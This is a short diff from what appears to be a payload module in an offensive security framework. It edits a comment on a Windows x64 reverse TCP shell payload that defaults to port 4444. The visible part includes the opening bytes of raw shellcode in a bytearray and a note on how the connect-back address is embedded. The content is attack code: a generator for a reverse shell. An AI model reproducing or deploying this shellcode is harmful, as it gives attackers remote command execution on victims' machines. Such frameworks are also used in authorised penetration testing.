@@ -20,7 +20,7 @@ class Module(Payload):
 	lport = OptPort(4444, "Connect to port", True)
 
 	def generate(self):
-		# Metasploit-style windows/x64/shell_reverse_tcp (EXITFUNC=thread) base for 127.0.0.1:4444.
+		# windows/x64 shell_reverse_tcp (EXITFUNC=thread) base for 127.0.0.1:4444.
 		# sockaddr is embedded as: mov r12, imm64  -> 49 BC <family/port/ip>
 		sc = bytearray(
 			b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
